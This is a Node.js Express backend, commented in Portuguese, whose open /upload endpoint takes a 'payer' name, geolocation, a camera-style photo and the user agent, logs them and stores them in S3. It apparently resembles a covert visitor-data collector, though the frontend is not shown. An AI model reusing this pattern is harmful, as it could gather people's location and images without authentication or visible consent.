const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// Configuração correta do S3 (SEM endpoint)
const s3 = new S3Client({
  region: process.env.AWS_REGION,
  credentials: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  },
});

const BUCKET_NAME = process.env.S3_BUCKET_NAME; // ex: rci-tools-lb-logs
const PREFIX = process.env.S3_PREFIX || 'tempdeveloper'; // ex: tempdeveloper

// Serve frontend
app.use(express.static(path.join(__dirname, '../frontend')));
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Endpoint para receber localização e imagem
app.post('/upload', async (req, res) => {
  try {
    const { timestamp, payer, location, image, userAgent } = req.body;

    console.log('=== NOVO PAYLOAD ===');
    console.log('Timestamp:', timestamp);
    console.log('Payer:', payer);
    console.log('Location:', location);
    console.log('Tem imagem?', !!image);
    console.log('User-Agent:', userAgent);

    const timestampNow = Date.now();

    // Monta prefixo corretamente
    const basePath = PREFIX ? `${PREFIX}/` : '';

    // =========================
    // 📄 Upload JSON
    // =========================
    const jsonKey = `${basePath}${timestampNow}_data.json`;

    await s3.send(new PutObjectCommand({
      Bucket: BUCKET_NAME,
      Key: jsonKey,
      Body: JSON.stringify({ timestamp, payer, location, userAgent }, null, 2),
      ContentType: 'application/json'
    }));

    console.log(`JSON enviado para o S3: ${jsonKey}`);

    // =========================
    // 🖼️ Upload imagem (se existir)
    // =========================
    if (image && image.startsWith('data:image/')) {

      // Detecta tipo da imagem automaticamente
      const mimeMatch = image.match(/^data:(image\/\w+);base64,/);
      const mimeType = mimeMatch ? mimeMatch[1] : 'image/png';

      const base64Data = Buffer.from(
        image.replace(/^data:image\/\w+;base64,/, ''),
        'base64'
      );

      const extension = mimeType.split('/')[1] || 'png';
      const imgKey = `${basePath}${timestampNow}_photo.${extension}`;

      await s3.send(new PutObjectCommand({
        Bucket: BUCKET_NAME,
        Key: imgKey,
        Body: base64Data,
        ContentType: mimeType
      }));

      console.log(`Imagem enviada para o S3: ${imgKey}`);

    } else {
      console.log('Nenhuma imagem válida enviada, pulando upload.');
    }

    res.status(200).json({ success: true });

  } catch (err) {
    console.error('❌ Erro ao salvar dados:');
    console.error(JSON.stringify(err, null, 2));

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Backend rodando na porta ${PORT}`));
